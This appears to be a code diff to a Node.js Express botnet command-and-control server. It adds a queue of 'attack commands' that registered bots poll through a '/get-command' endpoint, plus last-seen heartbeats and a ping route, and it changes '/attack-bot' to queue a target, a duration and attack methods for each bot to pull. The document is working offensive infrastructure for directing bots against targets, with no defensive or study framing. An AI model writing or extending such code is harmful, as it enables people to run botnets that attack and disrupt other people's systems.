@@ -461,6 +461,9 @@ app.get('/', (req, res) => {
   `);
 });
 
+// Pending attack commands queue
+let pendingCommands = {};
+
 // Auto-register endpoint - bots call this to register themselves
 app.post('/register', (req, res) => {
   const { url } = req.body;
@@ -472,6 +475,8 @@ app.post('/register', (req, res) => {
   // Check if bot already registered
   const exists = connectedBots.find(bot => bot.url === url);
   if (exists) {
+    // Update last seen time
+    exists.lastSeen = Date.now();
     return res.json({ message: 'Bot already registered', approved: true });
   }
 
@@ -479,7 +484,8 @@ app.post('/register', (req, res) => {
   const newBot = {
     url: url,
     time: new Date().toLocaleTimeString(),
-    approved: true
+    approved: true,
+    lastSeen: Date.now()
   };
 
   connectedBots.push(newBot);
@@ -492,12 +498,47 @@ app.post('/register', (req, res) => {
   });
 });
 
+// Bot polls for commands (pull-based system)
+app.get('/get-command', (req, res) => {
+  const { botUrl } = req.query;
+
+  if (!botUrl) {
+    return res.status(400).json({ error: 'Bot URL required' });
+  }
+
+  // Update bot last seen
+  const bot = connectedBots.find(b => b.url === botUrl);
+  if (bot) {
+    bot.lastSeen = Date.now();
+  }
+
+  // Check if there's a pending command for this bot
+  if (pendingCommands[botUrl]) {
+    const command = pendingCommands[botUrl];
+    delete pendingCommands[botUrl]; // Remove after sending
+    console.log(`[COMMAND-SENT] Sending command to ${botUrl}: ${command.methods}`);
+    return res.json({ hasCommand: true, command });
+  }
+
+  // No command
+  res.json({ hasCommand: false });
+});
+
 // Get all connected bots
 app.get('/bots', (req, res) => {
   res.json({ bots: connectedBots });
 });
 
-// Attack bot endpoint - send command to specific bot
+// Ping endpoint for bot heartbeat
+app.get('/ping', (req, res) => {
+  res.json({ 
+    alive: true, 
+    timestamp: Date.now(),
+    status: 'online'
+  });
+});
+
+// Attack bot endpoint - queue command for bot to pull
 app.get('/attack-bot', async (req, res) => {
   const { bot, target, time, methods } = req.query;
 
@@ -505,19 +546,17 @@ app.get('/attack-bot', async (req, res) => {
     return res.json({ success: false, error: 'Missing parameters' });
   }
 
-  try {
-    console.log(`[ATTACK-BOT] Sending to ${bot}: ${methods} -> ${target} for ${time}s`);
-    
-    const response = await axios.get(`${bot}/attack`, {
-      params: { target, time, methods },
-      timeout: 5000
-    });
+  console.log(`[QUEUE-COMMAND] Queuing ${methods} for ${bot}`);
+  
+  // Queue the command for the bot to pull
+  pendingCommands[bot] = {
+    target,
+    time,
+    methods,
+    timestamp: Date.now()
+  };
 
-    res.json({ success: true, data: response.data });
-  } catch (error) {
-    console.error(`[ERROR] Failed to contact ${bot}: ${error.message}`);
-    res.json({ success: false, error: error.message });
-  }
+  res.json({ success: true, message: 'Command queued for bot' });
 });
 
 // Direct server attack endpoint
